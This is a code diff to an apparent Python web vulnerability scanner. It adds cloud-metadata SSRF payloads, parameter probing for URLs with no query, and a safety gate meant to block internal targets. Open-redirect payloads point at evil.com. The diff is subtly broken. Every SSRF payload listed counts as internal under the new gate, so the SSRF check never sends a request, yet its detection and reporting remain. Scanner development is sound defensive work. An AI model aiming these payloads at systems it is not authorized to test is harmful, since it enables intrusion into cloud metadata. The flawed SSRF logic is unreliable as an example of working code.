@@ -68,11 +68,14 @@ XXE_PAYLOADS = [
 ]
 
 SSRF_PAYLOADS = [
-    "http://169.254.169.254/latest/meta-data/",
-    "http://127.0.0.1:8080/admin",
-    "http://localhost:8080/admin",
-    "http://metadata.google.internal/computeMetadata/v1/",
+    "http://169.254.169.254/latest/meta-data/",            # AWS IMDSv1
+    "http://metadata.google.internal/computeMetadata/v1/", # GCP
+    "http://169.254.169.254/metadata/instance",            # Azure
+    "http://ssrf-canary.secureforge.internal/test",        # DNS canary
 ]
+
+# Common parameter names to probe on clean (no-query) URLs
+PROBE_PARAMS = ["q", "id", "search", "user", "page", "file", "path", "input", "query", "name"]
 
 OPEN_REDIRECT_PAYLOADS = [
     "//evil.com", "https://evil.com", "///evil.com",
@@ -90,6 +93,24 @@ HEADER_INJECTION_PAYLOADS = {
 
 REDIRECT_PARAM_NAMES = ["redirect", "url", "next", "return", "return_to", "goto", "redir"]
 SSRF_PARAM_NAMES = ["url", "uri", "dest", "target", "page", "file", "path"]
+
+
+def _is_internal_url(url: str) -> bool:
+    """Return True if the URL resolves to an internal / RFC-1918 address."""
+    import ipaddress
+    try:
+        from urllib.parse import urlparse as _up
+        host = _up(url).hostname or ""
+        # reject loopback and link-local names
+        if host in ("localhost", "ip6-localhost", "ip6-loopback"):
+            return True
+        # reject link-local metadata hostnames
+        if host.endswith(".internal") or host.endswith(".local"):
+            return True
+        addr = ipaddress.ip_address(host)
+        return addr.is_private or addr.is_loopback or addr.is_link_local
+    except Exception:
+        return False
 
 
 class OWASPWebModule(BaseAttackModule):
@@ -186,16 +207,28 @@ class OWASPWebModule(BaseAttackModule):
 
                 sub_tasks = []
                 if query:
+                    # URL already has parameters — inject into each
                     for param in query:
                         sub_tasks.append(self._test_param_injection(session, sem, url, param))
+                    if test_open_redirect and any(p in query for p in REDIRECT_PARAM_NAMES):
+                        sub_tasks.append(self._test_open_redirect(session, sem, url, query))
+                    if test_ssrf and any(p in query for p in SSRF_PARAM_NAMES):
+                        sub_tasks.append(self._test_ssrf(session, sem, url, query))
+                else:
+                    # Clean URL — probe with synthetic common parameters
+                    for probe_param in PROBE_PARAMS:
+                        sub_tasks.append(self._test_param_injection(session, sem, url, probe_param))
+                    # Also probe SSRF and open redirect on clean URLs
+                    synthetic_query = {p: ["PROBE"] for p in PROBE_PARAMS}
+                    if test_open_redirect:
+                        sub_tasks.append(self._test_open_redirect(session, sem, url, synthetic_query))
+                    if test_ssrf:
+                        sub_tasks.append(self._test_ssrf(session, sem, url, synthetic_query))
+
                 sub_tasks.append(self._test_path_traversal_path(session, sem, url))
                 sub_tasks.append(self._test_forms(session, sem, url))
                 if test_headers_inj:
                     sub_tasks.append(self._test_header_injection(session, sem, url))
-                if test_open_redirect and any(p in query for p in REDIRECT_PARAM_NAMES):
-                    sub_tasks.append(self._test_open_redirect(session, sem, url, query))
-                if test_ssrf and any(p in query for p in SSRF_PARAM_NAMES):
-                    sub_tasks.append(self._test_ssrf(session, sem, url, query))
 
                 results = await asyncio.gather(*sub_tasks, return_exceptions=True)
                 for r in results:
@@ -502,23 +535,29 @@ class OWASPWebModule(BaseAttackModule):
         findings = []
         param = next((p for p in SSRF_PARAM_NAMES if p in query), None)
         if not param:
+            # On synthetic/probe queries use first available key
+            param = next(iter(query), None)
+        if not param:
             return findings
 
         async def try_ssrf(payload):
-            new_query = query.copy()
+            # Safety gate: never fire internal payloads
+            if _is_internal_url(payload):
+                return None
+            new_query = {k: v[0] if isinstance(v, list) else v for k, v in query.items()}
             new_query[param] = payload
-            new_url = urlparse(url)._replace(query=urlencode(new_query, doseq=True)).geturl()
+            new_url = urlparse(url)._replace(query=urlencode(new_query)).geturl()
             resp = await self._get(session, sem, new_url)
             if resp:
                 body = resp[2]
-                if "169.254.169.254" in body or "metadata" in body or "internal" in body:
+                if "169.254.169.254" in body or "metadata" in body or "ami-id" in body:
                     return self.finding(
                         title="SSRF Vulnerability",
-                        description=f"Parameter '{param}' appears to fetch external/internal URLs.",
+                        description=f"Parameter '{param}' appears to fetch external/internal URLs (IMDS response detected).",
                         severity=Severity.CRITICAL,
                         mitre_id="T1190",
-                        evidence=f"Payload: {payload}",
-                        remediation="Validate and restrict URL schemes and hosts.",
+                        evidence=f"Payload: {payload}\nURL: {new_url}",
+                        remediation="Validate and restrict URL schemes and hosts. Block IMDSv1.",
                     )
             return None
 
